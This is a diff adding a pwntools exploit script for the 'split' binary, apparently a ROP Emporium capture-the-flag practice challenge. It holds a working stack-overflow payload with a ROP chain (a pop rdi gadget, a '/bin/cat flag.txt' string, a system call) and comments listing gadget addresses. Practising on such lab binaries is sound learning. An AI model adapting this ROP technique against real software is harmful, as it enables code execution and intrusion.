@@ -1,0 +1,41 @@
+#!/usr/bin/env python2
+
+from pwn import *
+
+p = process('./split')
+print(p.recvuntil("..."))
+log.info("Received until ...")
+
+
+rop_chain = p64(0x00400883,endian = "little") #adds address of pop rdi; ret;
+rop_chain += p64(0x00601060,endian = "little") # adds "bin/cat flag.txt
+rop_chain += p64(0x00400810,endian = "little") # adds system call
+rop_chain += p64(0x42424242,endian = "little")
+
+p.sendline("A"*38 + rop_chain)
+log.info("ROP PAYLOAD %s", rop_chain)
+
+print(p.recvall())
+log.info("Received all")
+
+
+core = p.corefile
+stack = core.rsp
+pattern = core.read(stack,4)
+info("patter: %r", pattern)
+
+#split
+#0x00601060: UsefulStrings 
+#0x00400807: UsefulFunction     (contains /bin/ls but has no arguements)
+#0x00400883: Has the pop rdi; ret;
+
+
+
+
+#Split 32
+#0x08048649: Usefulfunction
+#0x0804a030: UsefulString
+
+
+
+
